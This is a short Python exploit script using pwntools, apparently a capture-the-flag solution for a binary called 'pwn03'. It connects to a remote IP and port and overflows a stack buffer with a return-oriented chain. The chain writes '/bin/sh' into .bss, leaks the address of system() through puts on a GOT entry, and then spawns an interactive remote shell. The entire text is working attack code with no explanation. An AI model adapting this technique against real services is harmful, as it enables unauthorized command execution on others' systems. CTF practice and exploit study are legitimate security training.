from pwn import *

gets = 0x08048430
puts = 0x08048460
bss = 0x804a050
main = 0x0804865a
got_system = 0x0804a020
padding = "a"*0x2b

s = remote("103.237.99.35", 25033)
#s = process("./pwn03")
s.recv()

payload = padding + p32(gets) + p32(main) + p32(bss)
s.sendline(payload)
s.recvuntil("me!\x0a")
s.sendline("/bin/sh\x00")
s.recvuntil("challenge!\x0a")

payload = padding + p32(puts) + p32(main) + p32(got_system)
s.sendline(payload)
s.recvuntil("me!\x0a")
system = u32(s.recv()[:4])

payload = padding + p32(system) + "aaaa" + p32(bss)
s.sendline(payload)
s.recv()
s.interactive()

s.close()

